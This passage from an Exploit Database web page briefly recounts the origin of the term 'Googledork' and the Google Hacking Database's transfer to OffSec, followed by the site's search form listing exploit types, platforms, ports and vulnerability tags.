by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


